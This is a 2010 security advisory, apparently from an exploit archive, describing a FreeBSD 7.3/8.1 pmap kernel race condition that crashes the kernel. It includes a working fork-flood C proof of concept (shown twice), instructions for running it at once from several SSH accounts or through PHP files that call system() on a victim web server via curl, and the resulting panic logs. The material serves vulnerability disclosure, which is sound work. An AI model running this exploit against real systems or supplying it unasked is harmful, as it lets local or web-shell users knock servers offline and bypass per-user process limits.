@@ -1,0 +1,343 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[ FreeBSD 8.1/7.3 vm.pmap kernel local race condition  ]
+
+Author: Maksymilian Arciemowicz
+http://SecurityReason.com
+http://lu.cxib.net
+Date:
+- - Dis.: 09.07.2010
+- - Pub.: 07.09.2010
+
+Affected Software (verified):
+- - FreeBSD 7.3/8.1
+
+Original URL:
+http://securityreason.com/achievement_securityalert/88
+
+
+- --- 0.Description ---
+maxproc
+    This is the maximum number of processes a user may be running. This
+includes foreground and background processes alike. For obvious reasons,
+this may not be larger than the system limit specified by the
+kern.maxproc sysctl(8). Also note that setting this too small may hinder
+a user's productivity: it is often useful to be logged in multiple times
+or execute pipelines. Some tasks, such as compiling a large program,
+also spawn multiple processes (e.g., make(1), cc(1), and other
+intermediate preprocessors).
+vm.pmap.shpgperproc
+        
+        
+- --- 1. FreeBSD 8.1/7.3 kernel local race condition ---
+Race condition in pmap, allows attackers to denial of service freebsd
+kernel. Creating a lot of process by fork() (~ kern.maxproc), it's
+possible to denial kernel.
+To bypass the MAXPROC from login.conf, we can use a few users to run PoC
+in this same time, to reach kern.maxproc. suphp can be very usefully.
+
+We need choose vector attack. When we have access to few users via ssh,
+use openssh.
+
+Example attack by ssh
+POC:
+
+/*
+FreeBSD 7.3/8.1 pmap race condition PoC
+Credit: Maksymilian Arciemowicz
+*/
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+void newproc(){
+again:
+fork();
+sleep(3600*24);
+goto again;
+}
+
+void runfork(){
+pid_t adr;
+if(0!=(adr=fork())) printf("fork not zero\n");
+else {
+printf("fork zero\n");
+newproc();
+}
+}
+
+int main(){
+
+int secdel=5;
+int dev;
+
+// clock with (int)secdel secound frequency
+while(1){
+printf("sleep %i sec\n",secdel);
+sleep(secdel);
+printf("weak up\n");
+
+// create 512 processes
+dev=512;
+while(dev--)
+runfork();
+}
+return 0;
+}
+
+
+127# ssh cx () 0
+Password:
+$ gcc -o poc81 poc81.c
+$ ./poc81
+
+and in the same time (symetric)
+
+127# ssh max () 0
+Password:
+$ gcc -o poc81 poc81.c
+$ ./poc81
+
+Result:
+Jul 29 08:41:29 127 kernel: maxproc limit exceeded by uid 1002, please
+see tuning(7) and login.conf(5).
+Jul 29 08:42:01 127 last message repeated 31 times
+Jul 29 08:44:02 127 last message repeated 119 times
+Jul 29 08:50:27 127 syslogd: kernel boot file is /boot/kernel/kernel
+Jul 29 08:50:27 127 kernel: maxproc limit exceeded by uid 0, please see
+tuning(7) and login.conf(5).
+Jul 29 08:50:27 127 kernel: panic: get_pv_entry: increase
+vm.pmap.shpgperproc
+Jul 29 08:50:27 127 kernel: cpuid = 0
+Jul 29 08:50:27 127 kernel: Uptime: 13m23s
+Jul 29 08:50:27 127 kernel: Cannot dump. Device not defined or unavailable.
+Jul 29 08:50:27 127 kernel: Automatic reboot in 15 seconds - press a key
+on the console to abort
+Jul 29 08:50:27 127 kernel: --> Press a key on the console to reboot,
+Jul 29 08:50:27 127 kernel: --> or switch off the system now.
+Jul 29 08:50:27 127 kernel: Rebooting...
+Jul 29 08:50:27 127 kernel: Copyright (c) 1992-2010 The FreeBSD Project.
+
+But when we have php-shell from several uid`s, we can also use suphp.
+
+Example attack by suphp:
+127# cat cxuser.php
+<?php
+        system("./def");
+?>
+127# ls -la
+total 16
+drwxr-xr-x  2 root  wheel   512 Jul 29 08:43 .
+drwxr-xr-x  4 root  wheel   512 Jul 29 08:38 ..
+- -rw-r--r--  1 cx    cx       27 Jul 29 08:38 cxuser.php
+- -rwxr-xr-x  1 cx    cx     7220 Jul 29 08:38 def
+- -rw-r--r--  1 max   max      27 Jul 29 08:43 maxuser.php
+
+now remote request to cxuser.php and maxuser.php
+
+curl http://victim/hack/cxuser.php
+and in the same time
+curl http://victim/hack/maxuser.php
+
+result:
+Jul 29 08:43:07 localhost login: ROOT LOGIN (root) ON ttyv0
+Jul 29 08:48:30 localhost syslogd: kernel boot file is /boot/kernel/kernel
+Jul 29 08:48:30 localhost kernel: maxproc limit exceeded by uid 1001,
+please see tuning(7) and login.conf(5).
+Jul 29 08:48:30 localhost kernel: panic: get_pv_entry: increase
+vm.pmap.shpgperproc
+Jul 29 08:48:30 localhost kernel: cpuid = 0
+Jul 29 08:48:30 localhost kernel: Uptime: 4m43s
+Jul 29 08:48:30 localhost kernel:
+Jul 29 08:48:30 localhost kernel: Dump failed. Partition too small.
+Jul 29 08:48:30 localhost kernel: Automatic reboot in 15 seconds - press
+a key on the console to abort
+Jul 29 08:48:30 localhost kernel: Rebooting...
+Jul 29 08:48:30 localhost kernel: Copyright (c) 1992-2010 The FreeBSD
+Project.
+
+
+- ---debug log - cron (uid=0)---
+...
+maxproc limit exceeded by uid 1002, please see tuning(7) and login.conf(5).
+maxproc limit exceeded by uid 1001, please see tuning(7) and login.conf(5).
+maxproc limit exceeded by uid 1001, please see tuning(7) and login.conf(5).
+maxproc limit exceeded by uid 1002, please see tuning(7) and login.conf(5).
+panic: get_pv_entry: increase vm.pmap.shpgperproc
+cpuid = 0
+KDB: enter: panic
+[ thread pid 7417 tid 106207 ]
+Stopped at kdb_enter+0x3a: movl $0,kdb_why
+...
+KDB: enter: panic
+[ thread pid 7417 tid 106207 ]
+Stopped at kdb_enter+0x3a: movl $0,kdb_why
+db> ps
+pid ppid pgrp uid state wmesg wchan cmd
+7417 880 880 0 RL CPU 0 cron
+7416 880 880 0 RL cron
+7415 7413 880 0 RVL cron
+7414 7412 7412 0 R sh
+7413 880 880 0 D ppwait 0xc8118548 cron
+7412 7411 7412 0 Ss wait 0xc8118aa0 sh
+7411 880 880 0 S piperd 0xc4d7eab8 cron
+7410 5367 1294 1001 RL+ def
+7409 5366 1294 1001 RL+ def
+7408 5365 1294 1001 RL+ def
+7407 5364 1294 1001 RL+ def
+7406 5363 1294 1001 RL+ def
+7405 5362 1294 1001 RL+ def
+7404 5361 1294 1001 RL+ def
+...
+db> trace
+Tracing pid 7417 tid 106207 td 0xc8113280
+kdb_enter(c0ccfb5c,c0ccfb5c,c0d0a037,e7f9da38,0,...) at kdb_enter+0x3a
+panic(c0d0a037,10,c0d09b5f,88c,0,...) at panic+0x136
+get_pv_entry(c80bcce0,0,c0d09b5f,ccd,c0fabd00,...) at get_pv entry+0x252
+pmap_enter(c80bcce0,a0f7000,1,c2478138,5,...) at pmap_enter+0x34c
+vm_fault(c8Obcc30,a0f7000,1,0,a0f711b,...) at vm_fault+0x1b02
+trap_pfault(5,0,c0dOblle,c0cd1707,c8118550,...) at trap_pfault+0xl0d
+trap(e7f9dd28) at trap+0x2d0
+calltrap() at calltrap+0x6
+- --- trap 0xc, eip = 0xa0f711b, esp = 0xbfbfec8c, ebp = 0xbfbfecc8 --
+db> show pcpu
+cpuid = 0
+dynamic pcpu = 0x627d00
+curthread = 0xc8113280: pid 7417 "cron"
+curpcb = 0xe7f9dd80
+fpcurthread = none
+idlethread = 0xc4183a00: tid 100003 "idle: cpu0"
+APIC ID = 0
+currentldt = 0x50
+spin locks held:
+...
+db> show registers
+cs 0x20
+ds 0xc0cc0028
+es 0xc0d00028
+fs 0xc08f0008 free_unr+0x188
+ss 0x28
+eax 0xc0ccfb5c
+ecx 0xc148792f
+edx 0
+ebx 0xl
+esp 0xe7f9d9f8
+ebp 0xe7f9da00
+esi 0x100
+edi 0xc8113280
+eip 0xc08de44a kdb_enter+0x3a
+efl 0x286
+kdb_enter+0x3a: movl $0,kdb_why
+...
+db> show page
+cnt.v_free_count: 104827
+cnt.v_cache_count: 11
+cnt.v_inactive_count: 3369
+cnt.v_active_count: 44397
+cnt.v_wire_count: 58250
+cnt.v_free_reserved: 324
+cnt.v_free_min: 1377
+cnt.v_free_target: 5832
+cnt.v_cache_min: 5832
+cnt.v_inactive_target: 8748
+...
+- ---debug log - crash in cron (uid=0)---
+
+- ---debug log - crash in def (uid=1001)---
+db> ps
+...
+6774 4777 2009 1001 RL+ def
+6773 4777 2009 1001 RL+ CPU 0 def
+6772 4777 2009 1001 RL+ def
+...
+db> show pcpu
+cpuid = 0
+dynamic pcpu = 0x627d00
+curthread = Oxc8c34c80: pid 6773 "def"
+curpcb = Oxe97f6d80
+fpcurthread = none
+idlethread = 0xc4183a00: tid 100003 "idle: cpu0"
+APIC ID = 0
+currentldt = 0x50
+spin locks held:
+...
+- ---debug log - crash in def (uid=1001)---
+
+- --- 2. PoC def2.c ---
+/*
+FreeBSD 7.3/8.1 pmap race condition PoC
+Credit: Maksymilian Arciemowicz
+*/
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+void newproc(){
+again:
+fork();
+sleep(3600*24);
+goto again;
+}
+
+void runfork(){
+pid_t adr;
+if(0!=(adr=fork())) printf("fork not zero\n");
+else {
+printf("fork zero\n");
+newproc();
+}
+}
+
+int main(){
+
+int secdel=5;
+int dev;
+
+// clock with (int)secdel secound frequency
+while(1){
+printf("sleep %i sec\n",secdel);
+sleep(secdel);
+printf("weak up\n");
+
+// create 512 processes
+dev=512;
+while(dev--)
+runfork();
+}
+return 0;
+}
+
+
+- --- 3. Greets ---
+sp3x, Infospec, Adam Zabrocki 'pi3'
+
+
+- --- 4. Contact ---
+Author: SecurityReason.com [ Maksymilian Arciemowicz ]
+
+Email:
+- - cxib {a\./t] securityreason [d=t} com
+
+GPG:
+- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+
+http://securityreason.com/
+http://lu.cxib.net/
+
+- -- 
+Best Regards,
+- ------------------------
+pub   1024D/A6986BD6 2008-08-22
+uid                  Maksymilian Arciemowicz (cxib)
+<cxib () securityreason com>
+sub   4096g/0889FA9A 2008-08-22
+
+http://securityreason.com
+http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+-----BEGIN PGP SIGNATURE-----
+
+iEYEARECAAYFAkyGff0ACgkQpiCeOKaYa9b0QQCfbY7yNcbUa7TDOTYxzgN7ya0y
+yQMAn079PHiu7Uy5WU3gvsJnvzZ0M8qO
+=D5mh
+-----END PGP SIGNATURE-----
